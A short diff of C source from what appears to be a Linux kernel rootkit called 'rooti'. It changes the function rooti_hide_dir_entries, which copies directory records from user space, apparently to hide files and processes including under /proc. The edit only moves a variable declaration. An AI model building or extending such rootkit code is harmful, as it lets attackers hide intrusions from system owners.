@@ -142,12 +142,14 @@ static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_
 size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir)
 {
     struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
+    int err;
+
     if (kernel_buf == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return count;
     }
 
-    int err = copy_from_user(kernel_buf, user_buf, count);
+    err = copy_from_user(kernel_buf, user_buf, count);
     if (err > 0) {
         ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(kernel_buf);
